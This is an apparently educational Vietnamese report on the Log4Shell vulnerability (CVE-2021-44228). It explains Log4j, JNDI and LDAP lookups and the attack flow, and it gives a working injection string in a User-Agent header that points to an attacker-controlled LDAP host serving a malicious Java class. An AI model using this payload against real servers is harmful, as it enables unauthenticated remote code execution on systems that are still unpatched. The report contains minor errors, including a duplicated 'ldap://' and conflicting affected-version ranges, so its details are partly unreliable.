# REPORT log4j (CVE-2021-44228)
- Mức độ nghiêm trọng: đạt 10/10 *(trong hệ thống đánh giá CVSS)*
- Khai thác lỗ hổng không yêu cầu xác thực, cho phép thực thi mã từ xa (RCE) trên bất kỳ ứng dụng nào sử dụng tiện ích **log4j**
## Table of Content
1. [Log4jShell](#Log4jShell)
2. [LDAP và JNDI là gì?](#LDAP-và-JNDI-là-gì?)
3. [LDAP và JNDI](#LDAP-và-JNDI)
4. [Log4j JNDI lookup](#Log4j-JNDI-Lookup)
6. [Kịch bản khai thác Log4j](Kịch-bản-khai-thác-Log4j)
7. [Exploit]
8. [Biện pháp phòng ngừa](#Biện-pháp-phòng-ngừa)
8. Exploiting Log4j (CVE-2021-44228)
9. Mitigation

### Log4jShell
Tính năng của JNDI trong Apache Log4j2 phiên bản 2.0-beta9 đến 2.12.1 và 2.13.0 đến 2.15.0 được sử dụng cho việc cấu hình (configuration), thông báo nhật ký (log messages) *(bao gồm cả các tham số liên quan)* không chống lại các LDAP và JNDI endpoint liên quan khác mà attacker đang có quyền kiểm soát. Vì thế nên, một khi attacker có thể kiểm soát các log messages hoặc các tham số của log messages thì có thể thực thi được mã code tùy ý được load từ LDAP server khi mà message lookup substitution được kích hoạt. 
- Loại lỗ hổng: Remote Code Execution
- Mức độ: Critical
- Base CVSS Score: 10.0
- Phiên bản bị ảnh hưởng: All versions from 2.0-beta9 to 2.14.1
#### Log4j là gì?
Apache Log4j hay thường gọi là Log4j *(một thành phần của Apache Logging Services)* là một trình ghi log *(thư viện/framework)* được viết bằng ngôn ngữ Java. 

Framework Apache Log4j đang được sử dụng bởi hơn 5 TRIỆU ứng dụng mã nguồn mở trên toàn cầu, con số này còn có thể lớn hơn gấp nhiều lần đối với các ứng dụng không công bố mã nguồn. Đây là phần mềm mã nguồn mở được duy trì bởi một nhóm lập trình viên tình nguyện của dự án phi lợi nhuận từ Apache Software Foundation.
### LDAP và JNDI là gì?
**LDAP (Lightweight Directory Access Protocol)** là một giao thức mở và đa nền tảng được sử dụng để xác thực dịch vụ thư mục (directory service authentication). Nó cung cấp ngôn ngữ giao tiếp mà ứng dụng sử dụng để giao tiếp với các dịch vụ thư mục khác. Các dịch vụ thư mục lưu trữ nhiều thông tin quan trọng như user account details, passwords, computer accounts,... được chia sẻ với các thiết bị khác trên mạng.

**JNDI (Java Naming and Directory Interface)** là một giao diện lập trình ứng dụng (API) cung cấp chức năng đặt tên (naming) và thư mục (directoty) cho các ứng dụng được viết bằng Ngôn ngữ lập trình Java.

![ldap&jndi1](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/1.png)

### LDAP và JNDI
JNDI cung cấp một API tiêu chuẩn để tương tác với các dịch vụ tên và thư mục *(name/directory services)* bằng cách sử dụng giao diện cung cấp dịch vụ (service provider interface-SPI). JNDI cung cấp cho các ứng dụng và đối tượng Java với giao diện mạnh mẽ và minh bạch để truy cập các dịch vụ thư mục như LDAP. Bảng dưới đây cho thấy các hoạt động tương đương LDAP và JNDI phổ biến.

![ldap&jndi](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/2.png)

### Log4j JNDI Lookup
Lookups là một cơ chế thêm giá trị vào cấu hình log4j ở những vị trí tùy ý. Log4j có khả năng thực hiện nhiều lookups như **map, system properties và JNDI (Java Naming and Directory Interface) lookups**.

Log4j sử dụng API JNDI để nhận các dịch vụ naming và directory (naming and directory services) từ một số providers sẵn như : **LDAP, COS (Common Object Services), Java RMI registry (Remote Method Invocation), DNS (Domain Name Service),...** 

Nếu chức năng này được thực thi, thì chúng ta có thể đặt dòng mã này ở BẤT KỲ đâu đó trong chương trình: **${jndi:logging/context-name}**

### Kịch bản khai thác Log4j

#### Kịch bản Log4j bình thường

![normal Lo4j scenario](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/3.png)

1. HTTP request được gửi tới server
2. Log4j log lại HTTP request vừa được gửi

#### Kịch bản khai thác Log4j

![exploit Log4j](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/4.png)

Khi attacker kiểm soát được log messages thì có thể dẫn tới việc thực thi được mã tùy ý trên những server mục tiêu. Những mã này được load từ LDAP server mỗi khi message lookup substitution được bật. Từ đó, payload sẽ được tải và thực thi trên máy nạn nhân. 

Ví dụ về cách thức kết hợp JNDI và LDAP để khai thác: 
```console
${jndi:ldap://<host>:<port>/<payload>}
```
1. Attacker chèn JNDI lookup vào header field (vị trí có khả năng được log lại)
> User-Agent: ${jndi:ldap://anonymous.com:1389/xxx}
2. Chuỗi được chuyển tới log4j để log.
> ${jndi:ldap://ldap://anonymous.com:1389/xxx}
3. Log4j nội suy chuỗi và truy vấn máy chủ LDAP độc hại.
4. LDAP server phản hồi bằng thông tin directory có chứa Java Class độc hại.
5. Java deserialize (hoặc tải xuống) Java Class độc hại và thực thi nó.

### Exploit 
Trạng thái không sử dụng thiết bị IPS/IDS
![noIPSIDS]{https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/log4jlab.drawio.png}

### Biện pháp phòng ngừa

Áp dụng thiết bị IPS/IDS 
